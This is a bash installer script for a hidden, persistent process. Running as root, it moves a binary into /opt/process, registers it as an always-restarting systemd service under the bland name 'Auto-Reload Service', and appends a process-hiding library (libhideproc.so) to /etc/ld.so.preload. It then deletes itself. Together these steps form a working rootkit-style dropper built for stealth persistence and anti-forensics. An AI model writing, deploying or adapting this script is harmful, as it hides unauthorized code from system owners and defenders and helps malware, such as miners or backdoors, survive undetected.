#!/bin/bash

# Make sure that the process is run as a root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

DIRECTORY="/opt/process"

if [ ! -d "$DIRECTORY" ]; then
    sudo mkdir -p "$DIRECTORY"
fi

LIB_FILE="libhideproc.so"
PROCESS_FILE="process"
# RUN_FILE="run.sh"

# for FILE in "$PROCESS_FILE" "$RUN_FILE"; do
#     if [ -e "./$FILE" ]; then
#         sudo mv -f "./$FILE" "$DIRECTORY"
#     elif [ ! -e "$DIRECTORY/$FILE" ]; then
#         echo "Fichier $FILE n'existe pas"
#         exit 1
#     fi
# done

if [ -e "./$PROCESS_FILE" ]; then
    sudo mv -f "./$PROCESS_FILE" "$DIRECTORY"
elif [ ! -e "$DIRECTORY/$PROCESS_FILE" ]; then
    echo "Fichier $PROCESS_FILE n'existe pas"
    exit 1
fi

if [ -e "./$LIB_FILE" ]; then
    mv -f "./$LIB_FILE" "/usr/local/lib/"
elif [ ! -e "$DIRECTORY/$LIB_FILE" ]; then
    echo "Fichier $LIB_FILE n'existe pas" 
    exit 1
fi

chmod +x "$DIRECTORY/$PROCESS_FILE" "$DIRECTORY/$RUN_FILE"

SERVICE_NAME="process.service"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME"
SCRIPT_PATH="$DIRECTORY/$PROCESS_FILE"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Auto-Reload Service
After=network.target

[Service]
Type=forking
PIDFile=/run/process.pid
ExecStart=$SCRIPT_PATH
WorkingDirectory=$DIRECTORY
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now "$SERVICE_NAME" >/dev/null 2>&1

sleep 2

LOG_FILE="$DIRECTORY/.status_output.txt"
if [ -f "$LOG_FILE" ]; then
    cat "$LOG_FILE"
    rm -f "$LOG_FILE"
else
    echo "Log file not found"
fi

# Add the hide library to the ld.so.preload
[ -f "/usr/local/lib/$LIB_FILE" ] && echo "/usr/local/lib/$LIB_FILE" | sudo tee -a /etc/ld.so.preload >/dev/null

# Self-delete the script
rm -f "$0"